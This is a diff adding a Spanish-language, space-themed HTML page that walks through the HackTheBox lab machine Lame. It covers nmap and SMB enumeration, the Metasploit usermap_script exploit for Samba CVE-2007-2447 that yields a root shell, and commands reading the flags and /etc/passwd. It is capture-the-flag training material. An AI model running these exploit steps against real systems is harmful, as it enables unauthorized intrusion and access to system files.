@@ -1,0 +1,148 @@
+<!-- Machine: Lame -->
+<div id="machine-lame" class="page-content" style="display: none;">
+    <div class="machine-page">
+        <div class="machine-page-header">
+            <div class="machine-page-title-section">
+                <h1 class="machine-page-title">🐧 Lame</h1>
+                <div class="machine-badges">
+                    <span class="badge difficulty-easy">Explorador Novato</span>
+                    <span class="badge badge-platform">HackTheBox</span>
+                </div>
+            </div>
+            <p class="machine-description">
+                La legendaria estación Lame, ubicada en las coordenadas 10.10.10.3, representa 
+                uno de los primeros desafíos en el universo de HackTheBox. Esta fortaleza Linux 
+                ancestral alberga vulnerabilidades clásicas en su sistema Samba que permiten 
+                una infiltración directa sin necesidad de escalación compleja.
+            </p>
+        </div>
+
+        <div class="machine-image-section">
+            <img src="https://images.unsplash.com/photo-1550751827-4bd374c3f58b?w=800&h=400&fit=crop&crop=entropy" 
+                 alt="Lame Space Station" 
+                 class="machine-image">
+        </div>
+
+        <div class="notes-section">
+            <h2 class="notes-title">
+                <span>⚔️</span>
+                Crónicas de Batalla
+            </h2>
+
+            <div class="step">
+                <h3 class="step-title">🔭 Escaneo de Coordenadas</h3>
+                <p class="step-content">
+                    Comenzamos el análisis de la estación objetivo para identificar 
+                    todos los servicios y puertos disponibles:
+                </p>
+                <div class="code-block">
+                    <pre><code># Mapeo completo de la estación Lame
+nmap -sC -sV -oA lame_scan 10.10.10.3
+
+# Escaneo agresivo para mayor detalle
+nmap -A -T4 10.10.10.3
+
+# Verificación de servicios SMB específicos
+nmap --script smb-vuln-* 10.10.10.3</code></pre>
+                </div>
+                <p class="step-content">
+                    <strong>Arsenal de servicios identificados:</strong><br>
+                    • Puerto 21: FTP vsftpd 2.3.4<br>
+                    • Puerto 22: SSH OpenSSH 4.7p1<br>
+                    • Puerto 139: NetBIOS Samba<br>
+                    • Puerto 445: Microsoft-DS Samba 3.0.20-Debian
+                </p>
+            </div>
+
+            <div class="step">
+                <h3 class="step-title">🔍 Análisis del Sistema Samba</h3>
+                <p class="step-content">
+                    Procedemos a enumerar exhaustivamente el servicio Samba en busca de 
+                    vulnerabilidades explotables:
+                </p>
+                <div class="code-block">
+                    <pre><code># Enumeración de recursos compartidos
+smbclient -L //10.10.10.3
+
+# Análisis profundo con enum4linux
+enum4linux 10.10.10.3
+
+# Mapeo de recursos disponibles
+smbmap -H 10.10.10.3
+
+# Verificación de versión exacta
+smbclient -L 10.10.10.3 -N</code></pre>
+                </div>
+                <p class="step-content">
+                    <strong>Vulnerabilidad crítica detectada:</strong> El sistema ejecuta 
+                    <strong>Samba 3.0.20-Debian</strong>, que presenta una falla de seguridad 
+                    crítica conocida como CVE-2007-2447, permitiendo ejecución remota de código.
+                </p>
+            </div>
+
+            <div class="step">
+                <h3 class="step-title">🚀 Lanzamiento del Ataque</h3>
+                <p class="step-content">
+                    Utilizamos el framework Metasploit para explotar la vulnerabilidad 
+                    identificada y obtener acceso directo al sistema:
+                </p>
+                <div class="code-block">
+                    <pre><code># Inicialización del framework de ataque
+msfconsole
+
+# Selección del exploit para Samba usermap_script
+use exploit/multi/samba/usermap_script
+
+# Configuración del objetivo
+set RHOSTS 10.10.10.3
+
+# Configuración de la estación de comando
+set LHOST 10.10.14.X
+
+# Verificación de configuración
+show options
+
+# Lanzamiento del ataque
+exploit</code></pre>
+                </div>
+                <p class="step-content">
+                    <strong>Resultado del ataque:</strong> Shell de comando obtenida 
+                    exitosamente con privilegios de administrador root del sistema.
+                </p>
+            </div>
+
+            <div class="step">
+                <h3 class="step-title">🏆 Captura de Trofeos</h3>
+                <p class="step-content">
+                    Con acceso root directo obtenido, procedemos a capturar las flags 
+                    objetivo sin necesidad de escalación adicional:
+                </p>
+                <div class="code-block">
+                    <pre><code># Verificación de privilegios actuales
+whoami && id
+
+# Exploración del sistema de archivos
+ls -la /home/
+ls -la /root/
+
+# Captura de flag de usuario
+cat /home/makis/user.txt
+
+# Captura de flag de administrador
+cat /root/root.txt
+
+# Información adicional del sistema
+uname -a
+cat /etc/passwd</code></pre>
+                </div>
+                <div class="success-box">
+                    <p class="success-text">
+                        <span>🎖️</span>
+                        <strong>Victoria Total:</strong> Estación Lame conquistada completamente. 
+                        Acceso root directo sin escalación requerida. ¡Misión perfecta!
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
